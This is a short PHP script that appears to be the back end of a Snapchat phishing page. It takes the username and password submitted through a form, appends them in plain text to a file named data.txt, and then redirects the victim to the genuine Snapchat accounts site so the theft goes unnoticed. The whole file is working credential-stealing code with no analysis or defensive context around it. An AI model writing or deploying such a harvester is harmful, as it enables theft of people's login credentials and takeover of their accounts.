<?php
ini_set('display_errors', '1');
$username=$_POST['username'];
$password=$_POST['password'];
$fp = fopen('data.txt', 'a+');
fwrite($fp, "login - ". $username."\n");
fwrite($fp, "password - ". $password."\n");
fwrite($fp, "--------------------------"."\n");
fclose($fp);
header("Location: https://accounts.snapchat.com/");
exit();
?> 